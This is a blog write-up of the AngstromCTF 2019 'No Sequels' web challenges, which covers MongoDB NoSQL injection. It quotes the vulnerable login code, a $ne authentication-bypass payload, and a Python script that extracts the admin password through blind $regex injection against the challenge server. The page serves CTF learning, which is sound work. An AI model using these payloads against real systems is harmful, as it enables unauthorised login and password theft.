<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>AngstromCTF2019: No Sequels 1 &amp;&amp; 2</title><meta property="og:title" content="AngstromCTF2019: No Sequels 1 &amp;&amp; 2"><meta name=twitter:title content="AngstromCTF2019: No Sequels 1 &amp;&amp; 2"><meta name=description content="MongoDB query selectors and blind injection"><meta property="og:description" content="MongoDB query selectors and blind injection"><meta name=twitter:description content="MongoDB query selectors and blind injection"><meta name=author content="Morgaine Timms"><link href=https://timms.io/logo.ico rel=icon type=image/x-icon><meta property="og:url" content="https://timms.io/ctf/2019/angstrom/no-sequels/"><meta property="og:type" content="website"><meta property="og:site_name" content="TimmsIO"><link rel=canonical href=https://timms.io/ctf/2019/angstrom/no-sequels/><link rel=stylesheet href=/style.main.min.080192c78542581b270a9b4bebb2662b6e9afa748d49b35b95d078f750c6b46c.css media=screen></head><body><nav id=primary-nav class="navbar is-black" role=navigation aria-label="main navigation"><div class=container><div class=navbar-brand><a class=navbar-item href=https://timms.io><img src=/logo.svg alt=TimmsIO><span class="site-title is-size-4" style=padding-left:1rem;padding-right:1rem>|| TimmsIO</span></a><div role=button class="navbar-burger burger" aria-label=menu aria-expanded=false data-target=navbarMenu><span aria-hidden=true></span><span aria-hidden=true></span><span aria-hidden=true></span></div></div><div class=navbar-menu id=navbarMenu><div class=navbar-start></div><div class=navbar-end><a class=navbar-item title=About href=/#contact>About</a><div class="navbar-item has-dropdown"><a class=navbar-link title=Posts>Posts</a><div class=navbar-dropdown><a class=navbar-item title=Blog href=/categories/blog/>Blog</a>
<a class=navbar-item title=Writeups href=/categories/writeups/>Writeups</a>
<a class=navbar-item title=CTFs href=/categories/ctfs>CTFs</a><hr class=navbar-divider><a class=navbar-item title=All href=/posts>All</a></div></div><a class=navbar-item title=Projects href=/projects>Projects</a></div></div></div></nav><div class=page-blocks></div><section class="hero is-medium" style=background-image:url(/image/Angstrom_Unit_hu3d03a01dcc18bc5be0e67db3d8d209a6_278776_1600x1600_fit_q75_box.jpg)><div class="container hero-body has-text-centered" style="text-shadow:-1px 0 #000,0 1px #000,1px 0 #000,0 -1px #000"><h1 class="title is-1 has-text-white">AngstromCTF2019: No Sequels 1 &amp;&amp; 2</h1></div></section><div class="columns is-gapless is-desktop"><div class=column><section class="section container content"><div class="tio-page columns is-centered"><div class="column is-four-fifths-tablet is-three-quarters-widescreen has-background-dark has-text-light"><h1 id=angstromctf2019-no-sequels-1-2>AngstromCTF2019: No Sequels 1 &amp;&amp; 2</h1><h2 id=the-challenge>The Challenge</h2><p>Two parts, 130pts total.</p><p>Part 1</p><blockquote><p>No Sequels
Web
50</p><p>The prequels sucked, and the sequels aren&rsquo;t much better, but at least we always have the original trilogy.</p><p>Author: SirIan</p><p>link: <a href=https://nosequels.2019.chall.actf.co/>https://nosequels.2019.chall.actf.co/</a></p></blockquote><p>Part 2</p><blockquote><p>No Sequels 2
Web
80</p><p>This is the sequel to No Sequels. You&rsquo;ll see the challenge page once you solve the first one.</p><p>Author: SirIan</p></blockquote><h2 id=the-solution>The Solution</h2><h3 id=part-1>PART 1</h3><p>The linked page is a simple login screen, with a snippet of NodeJS code for the <code>POST /login</code> route provided</p><figure class=image><img src=/assets/posts/angstromctf2019/12DA5BC3247B3F2A6992F3B3578EFA61.jpg></figure><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, <span style=color:#a6e22e>verifyJwt</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) {
    <span style=color:#75715e>// monk instance
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>db</span>;
 
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>username</span>;
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>pass</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>password</span>;
 
    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>pass</span>){
        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;One or more fields were not provided.&#34;</span>);
    }
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>query</span> <span style=color:#f92672>=</span> {
        <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>,
        <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>pass</span>
    }
 
    <span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>collection</span>(<span style=color:#e6db74>&#39;users&#39;</span>).<span style=color:#a6e22e>findOne</span>(<span style=color:#a6e22e>query</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>err</span>, <span style=color:#a6e22e>user</span>) {
        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span>){
            <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Wrong username or password&#34;</span>);
            <span style=color:#66d9ef>return</span>
        }
 
        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>cookie</span>(<span style=color:#e6db74>&#39;token&#39;</span>, <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>({<span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>authenticated</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>}, <span style=color:#a6e22e>secret</span>));
        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#34;/site&#34;</span>);
    });
});
</code></pre></div><p>In the code, the POST body parameters <code>​username</code>​ and <code>​password</code>​ are passed directly to a database without sanitisation. This is probably an injection point.</p><p>The syntax used (<code>​db.collection('users').findOne(…</code>​) looks like mongodb, and the reference to a &ldquo;monk instance&rdquo; confirms this.</p><p>Using <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>a list of NoSQL payloads</a> we can get issued an authenticated JWT with the following payload. This should result in authentication as the first available user record.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>{
    <span style=color:#e6db74>&#34;username&#34;</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#34;$ne&#34;</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span>},
    <span style=color:#e6db74>&#34;password&#34;</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#34;$ne&#34;</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span>}
}
</code></pre></div><p>The server dutifully responds with a user token and redirects.</p><figure class=image><img src=/assets/posts/angstromctf2019/DE79BE2C31825AB331C6C0D7FE131406.png></figure><h3 id=part-2>PART 2</h3><p>The authenticated page at <code>GET /site</code> provides the name of the admin user object in the database, and the code snippet for the POST route</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;/site&#39;</span>, <span style=color:#a6e22e>verifyJwt</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) {
    <span style=color:#75715e>// req.user is assigned from verifyJwt
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>authenticated</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>pass2</span>) {
        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;bad&#34;</span>);
    }
 
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>query</span> <span style=color:#f92672>=</span> {
        <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>name</span>,
    }
 
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>db</span>;
    <span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>collection</span>(<span style=color:#e6db74>&#39;users&#39;</span>).<span style=color:#a6e22e>findOne</span>(<span style=color:#a6e22e>query</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>err</span>, <span style=color:#a6e22e>user</span>) {
        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>user</span>);
        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span>){
            <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>&#39;access&#39;</span>, {<span style=color:#a6e22e>username</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#39; \&#39;&#39;</span><span style=color:#f92672>+</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>name</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;\&#39; &#39;</span>, <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;Only user &#39;admin&#39; can log in with this form!&#34;</span>});
        }
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>pass</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>password</span>;
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>message</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>pass</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>pass2</span>){
            <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>&#39;final&#39;</span>);
        } <span style=color:#66d9ef>else</span> {
            <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>&#39;access&#39;</span>, {<span style=color:#a6e22e>username</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#39; \&#39;&#39;</span><span style=color:#f92672>+</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>name</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;\&#39; &#39;</span>, <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;Wrong LOL!&#34;</span>});
        }
 
    });
 
});
</code></pre></div><p>The next flag requires acquisition of the password for user ‘admin’.</p><p>In part 1 <a href=https://docs.mongodb.com/manual/reference/operator/query/>mongodb query selectors</a> were used for <em>both</em> the user and password parameters provided to <code>POST /login</code>.</p><p>Now that the target username is known, it will be possible to reconstruct the password with a Blind NoSQL injection on the password field.</p><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>This script from github</a> is more than sufficient. It uses the regex query selector to build the password one character at a time.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
<span style=color:#f92672>import</span> urllib3
<span style=color:#f92672>import</span> string
<span style=color:#f92672>import</span> urllib
urllib3<span style=color:#f92672>.</span>disable_warnings()

username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;admin&#34;</span>
password<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
u<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://nosequels.2019.chall.actf.co/login&#34;</span>
headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;content-type&#39;</span>: <span style=color:#e6db74>&#39;application/json&#39;</span>}

<span style=color:#66d9ef>while</span> True:
    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string<span style=color:#f92672>.</span>printable:
        <span style=color:#66d9ef>if</span> c <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;*&#39;</span>,<span style=color:#e6db74>&#39;+&#39;</span>,<span style=color:#e6db74>&#39;.&#39;</span>,<span style=color:#e6db74>&#39;?&#39;</span>,<span style=color:#e6db74>&#39;|&#39;</span>]:
            payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;{&#34;username&#34;: {&#34;$eq&#34;: &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;}, &#34;password&#34;: {&#34;$regex&#34;: &#34;^</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34; }}&#39;</span> <span style=color:#f92672>%</span> (username, password <span style=color:#f92672>+</span> c)
            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(u, data <span style=color:#f92672>=</span> payload, headers <span style=color:#f92672>=</span> headers, verify <span style=color:#f92672>=</span> False)
            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;OK&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
                <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Found one more char : </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (password<span style=color:#f92672>+</span>c))
                password <span style=color:#f92672>+=</span> c</code></pre></div><p>After retrieving the password (“congratsyouwin”) it is possible to log in to the page in part 2 and get the flag: <code>act{still_no_sql_in_the_sequel}</code></p><figure class=image><img src=/assets/posts/angstromctf2019/67AF52332EB7EAD9D19748723F833B1B.png></figure></div></div></section></div></div><link href=https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet integrity=sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN crossorigin=anonymous><noscript><style>.navbar-burger-toggle+.navbar-burger{margin-top:-3.5em}.navbar-burger-toggle:checked+.navbar-burger span:nth-child(1){transform:translateY(5px)rotate(45deg)}.navbar-burger-toggle:checked+.navbar-burger span:nth-child(2){opacity:0}.navbar-burger-toggle:checked+.navbar-burger span:nth-child(3){transform:translateY(-5px)rotate(-45deg)}.navbar-burger-toggle:checked~.navbar-menu{display:block}</style></noscript><script>'use strict';document.addEventListener('DOMContentLoaded',function(){var $dropdowns=getAll('.navbar-item.has-dropdown:not(.is-hoverable)');if($dropdowns.length>0){$dropdowns.forEach(function($el){$el.addEventListener('click',function(event){event.stopPropagation();$el.classList.toggle('is-active');});});document.addEventListener('click',function(event){closeDropdowns();});}
function closeDropdowns(){$dropdowns.forEach(function($el){$el.classList.remove('is-active');});}
document.addEventListener('keydown',function(event){var e=event||window.event;if(e.keyCode===27){closeDropdowns();}});var $burgers=getAll('.burger');if($burgers.length>0){$burgers.forEach(function($el){$el.addEventListener('click',function(){var target=$el.dataset.target;var $target=document.getElementById(target);$el.classList.toggle('is-active');$target.classList.toggle('is-active');});});}
function getAll(selector){return Array.prototype.slice.call(document.querySelectorAll(selector),0);}});</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-77343548-1"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}
gtag('js',new Date());gtag('config','UA-77343548-1');</script></body></html>